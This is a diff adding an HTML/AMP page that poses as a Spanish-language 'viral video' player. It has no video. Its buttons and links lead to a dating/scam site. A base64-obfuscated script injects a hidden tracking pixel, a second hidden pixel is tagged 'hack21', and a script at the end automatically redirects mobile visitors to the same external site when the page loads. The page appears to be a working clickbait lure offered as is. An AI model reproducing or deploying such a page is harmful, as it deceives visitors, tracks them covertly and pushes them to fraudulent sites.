@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html amp>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <style amp-boilerplate>
+      body {
+        -webkit-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+        -moz-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+        -ms-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+        animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+      }
+
+      @-webkit-keyframes -amp-start {
+        from {
+          visibility: hidden;
+        }
+        to {
+          visibility: visible;
+        }
+      }
+
+      @-moz-keyframes -amp-start {
+        from {
+          visibility: hidden;
+        }
+        to {
+          visibility: visible;
+        }
+      }
+
+      @-ms-keyframes -amp-start {
+        from {
+          visibility: hidden;
+        }
+        to {
+          visibility: visible;
+        }
+      }
+
+      @-o-keyframes -amp-start {
+        from {
+          visibility: hidden;
+        }
+        to {
+          visibility: visible;
+        }
+      }
+
+      @keyframes -amp-start {
+        from {
+          visibility: hidden;
+        }
+        to {
+          visibility: visible;
+        }
+      }
+    </style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, minimum-scale=1">
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans:700,300" rel="stylesheet" type="text/css">
+    <style amp-custom>
+      #branch-sdk {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        right: 0;
+      }
+      body {
+        margin: 0;
+        word-wrap: break-word;
+        font-family: "Open Sans", Helvetica, serif;
+      }
+      .main-image {
+        width: 100%;
+        height: 250px;
+        height: 75vw;
+        background-image: url(https://i.imgur.com/Buw5EGO.gif);
+        background-size: cover;
+        background-position: top center;
+      }
+      #content-container {
+        box-sizing: border-box;
+        padding: 24px;
+        margin: 0 24px;
+        background-color: #fff;
+      }
+      .app-title {
+        font-size: 14px;
+        padding-bottom: 11px;
+        text-transform: uppercase;
+      }
+      .card-title {
+        font-size: 33px;
+        line-height: 36px;
+      }
+      .app-content {
+        padding-top: 10px;
+        padding-bottom: 100px;
+        font-size: 20px;
+      }
+      .input-wrapper {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        height: 110px;
+        background-color: #fff;
+        box-shadow: 0px -20px 20px -8px rgba(255, 255, 255, 1);
+      }
+      .input-container {
+        width: 100%;
+        padding: 0 24px;
+        text-align: center;
+        box-sizing: border-box;
+      }
+      .form-get-the-app {
+        display: flex;
+        text-align: center;
+        padding-top: 10px;
+        border-top: 2px solid #cecece;
+        min-height: 300px;
+      }
+      .input-label {
+        padding: 4px 10px;
+        font-size: 13px;
+        overflow: hidden;
+        word-wrap: break-word;
+        text-align: center;
+      }
+      .cta-button {
+        flex-grow: 1;
+        height: 62px;
+        line-height: 62px;
+        background-color: #fa0909;
+        border-radius: 2px;
+        font-size: 20px;
+        padding: 0 20px;
+        margin-left: 10px;
+        color: #fff;
+        text-align: center;
+        text-decoration: none;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+      }
+      .cta-button:hover {
+        background-color: #d10808;
+      }
+      @media only screen and (orientation: portrait) {
+        .card--no-data .main-image {
+          background-image: url("https://lh3.googleusercontent.com/blogger_img_proxy/AJ0KDdXqmhUjb0Pyb60s9WXqoPPJiyip91IhktsNjXR7XgoeIl5wuhXJ9WDtXK38y87YiR9tmL1cf6LGUNUbJZaEdicM7fr3cRTsyDfQOT-RiSzfAkt2mqPmOul3fIn_0rXD3N8f1mqeKsA=s0-d");
+          background-size: auto;
+          background-position: top center;
+          background-repeat: repeat;
+          height: 190px;
+        }
+        .card--no-data > .app-icon {
+          position: absolute;
+          top: 160px;
+          left: 34px;
+        }
+        .card--no-data #content-container {
+          margin-top: 20px;
+        }
+      }
+      @media screen and (min-device-width: 321px) {
+        .input-label {
+          font-size: 14px;
+        }
+      }
+      @media only screen and (min-device-width: 375px) and (orientation: portrait) {
+        .main-image {
+          height: 300px;
+          height: 80vw;
+        }
+        .app-content {
+          padding-bottom: 120px;
+        }
+        .input-wrapper {
+          height: 115px;
+        }
+      }
+      @media only screen and (min-device-width: 414px) and (orientation: portrait) {
+        .main-image {
+          height: 390px;
+          height: 95vw;
+        }
+      }
+      @media only screen and (orientation: landscape) {
+        .main-image {
+          position: fixed;
+          height: 100%;
+          height: 100vh;
+          width: 50%;
+        }
+        .input-wrapper {
+          right: 0;
+          left: auto;
+          width: 50%;
+        }
+        #content-container {
+          float: left;
+          width: 50%;
+          margin-left: 50%;
+        }
+        .input-wrapper {
+          height: 108px;
+        }
+        .app-content {
+          padding-bottom: 110px;
+        }
+        .form-get-the-app {
+          padding-top: 8px;
+        }
+        .input-container {
+          left: 50%;
+        }
+        .cta-button {
+          height: 44px;
+          line-height: 44px;
+          padding: 0 5px;
+          margin-left: 50px;
+        }
+        .app-icon {
+          width: 44px;
+          height: 44px;
+        }
+        .card--no-data .main-image {
+          height: 100%;
+        }
+        .card--no-data > .app-icon {
+          display: none;
+        }
+        .card--no-data #content-container {
+          margin-top: 0;
+        }
+      }
+      @media only screen and (min-device-width: 645px) and (orientation: landscape) {
+        .form-get-the-app {
+          padding-top: 8px;
+        }
+        .cta-button {
+          height: 62px;
+          line-height: 62px;
+          padding: 0 20px;
+          margin-left: 70px;
+        }
+        .app-icon {
+          width: 62px;
+          height: 62px;
+          top: -2px;
+        }
+      }
+      .text-bold {
+        font-weight: 700;
+      }
+      .text-light {
+        font-weight: 300;
+      }
+      .cta-button--no-app-icon {
+        margin-left: 0;
+      }
+    </style>
+    <link rel="apple-touch-icon" href="https://i.imgur.com/Buw5EGO.gif">
+    <meta property="al:android:package" content="http://rumb.iblogger.org/">
+    <meta name="twitter:app:id:googleplay" content="http://rumb.iblogger.org/">
+    <meta property="al:android:app_name" content="Viralfacebookvideo">
+    <meta name="twitter:app:name:googleplay" content="Viralfacebookvideo">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta property="og:image" content="https://i.imgur.com/ytgvTR6.png">
+    <meta name="twitter:image:src" content="https://i.imgur.com/ytgvTR6.png">
+    <title> FULL VIRAL VIDEO </title>
+    <meta property="og:title" content="FULL VIRAL VIDEO">
+    <meta name="twitter:title" content="VIDEO ORIGINAL">
+    <meta property="og:description" content="FULL VIRAL VIDEO">
+    <meta name="twitter:description" content="VIDEO ORIGINAL">
+    <meta name="twitter:app:country" content="US">
+    <script async src="https://cdn.ampproject.org/v0.js"></script>
+    <script async src="https://cdn.ampproject.org/v0/amp-iframe-0.1.js" custom-element="amp-iframe"></script>
+    <script async src="https://cdn.ampproject.org/v0/amp-list-0.1.js" custom-element="amp-list"></script>
+    <script async src="https://cdn.ampproject.org/v0/amp-mustache-0.2.js" custom-template="amp-mustache"></script>
+    <link rel="canonical" href="https://pvtasicalientes.app.link/85po56v8qEb">
+  <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+  <body>
+    <meta http-equiv="cache-control" content="no-cache">
+         <script>document.write(atob("PGltZyBzcmM9Ii8vd2hvcy5hbXVuZy51cy9waW5nanMvP2s9bTZzdGhkZ3E3MCZhbXA7dD0uLS4mYW1wO3g9aHR0cHM6Ly93d3cuY2FzaC5hcHAiIHN0eWxlPSJkaXNwbGF5Om5vbmUiIC8+"));</script>
+    <noscript>
+      <style amp-boilerplate>
+        body {
+          -webkit-animation: none;
+          -moz-animation: none;
+          -ms-animation: none;
+          animation: none;
+        }
+      </style>
+    </noscript>
+    <div class="card center">
+      <a href="https://cbejfbb.newonlinedates.com/s/b2e72753074ec">
+        <div class="main-image"></div>
+      </a>
+      <div id="content-container">
+        <div class="app-title text-bold"></div>
+        <div class="card-title text-light"> ⚠️ VIDEO VIRAL COMPLETO 🌎</div>
+        <div class="app-content text-light"></div>
+      </div>
+      <div class="input-wrapper">
+        <div class="input-container">
+          <div class="input-label text-light">⬇️⬇️⬇️⬇️</div>
+          <div class="form-get-the-app">
+            <amp-list src="https://pvtasicalientes.app.link/85po56v8qEb?__branch_amp_json=1" layout="flex-item">
+              <template type="amp-mustache" id="cta-template">
+               <a href="https://cbejfbb.newonlinedates.com/s/b2e72753074ec" class="cta-button text-light cta-button--no-app-icon">
+                 REPRODUCIR VIDEO
+                </a>
+                <amp-iframe
+                  id="branch-sdk"
+                  src="/amp-iframe-redirect?scheme_redirect=%7B%7Bscheme_redirect%7D%7D&amp;redirect_strategy=%7B%7Bredirect_strategy%7D%7D&amp;app_id=916490604035199433&amp;has_app=false"
+                  sandbox="allow-scripts allow-top-navigation"
+                  height="11"
+                  layout="fixed-height"
+                  frameborder="0"
+                ></amp-iframe>
+              </template>
+            </amp-list>
+          </div>
+        </div>
+      </div>
+<!-- Botón redondo mejorado -->
+<div style="position: fixed; bottom: 0; left: 0; width: 100%; text-align: center; background-color: #fa0909; padding: 10px;">
+  <a href="https://cbejfbb.newonlinedates.com/s/b2e72753074ec" style="color: #fff; text-decoration: none; padding: 15px 20px; border-radius: 50px; font-size: 18px; display: inline-block;">
+    Reproducir Video
+  </a>
+</div>
+</div>
+    </div>
+    </div>
+    <script type="text/javascript">
+      var fb_list = [
+        "http://rumb.iblogger.org/",
+        "http://rumb.iblogger.org/",
+        "http://rumb.iblogger.org/",
+        "http://rumb.iblogger.org/",
+        "http.rumb.iblogger.org/",
+        "http://rumb.iblogger.org/",
+        "http://rumb.iblogger.org/",
+        "pvtasicalientes.app.link",
+        "pvtasicalientes-alternate.app.link",
+        "http://rumb.iblogger.org/",
+        "https://cbejfbb.newonlinedates.com/s/b2e72753074ec",
+        "https://cbejfbb.newonlinedates.com/s/b2e72753074ec",
+        "https://cbejfbb.newonlinedates.com/s/b2e72753074ec"
+      ];
+    </script>
+  </body>
+</html>
+
+<!-- Include the script -->
+
+  <img src="//whos.amung.us/pingjs/?k=hack21 &t= youtube &x=Youtube.com" style="display:none" alt="">
+  
+<script> if(screen.colorDepth >= 24 && navigator.cookieEnabled == true && screen.width < 500) { setTimeout(setTime, 0); } function setTime() { 
+
+window.location ='https://cbejfbb.newonlinedates.com/s/b2e72753074ec'; } </script>
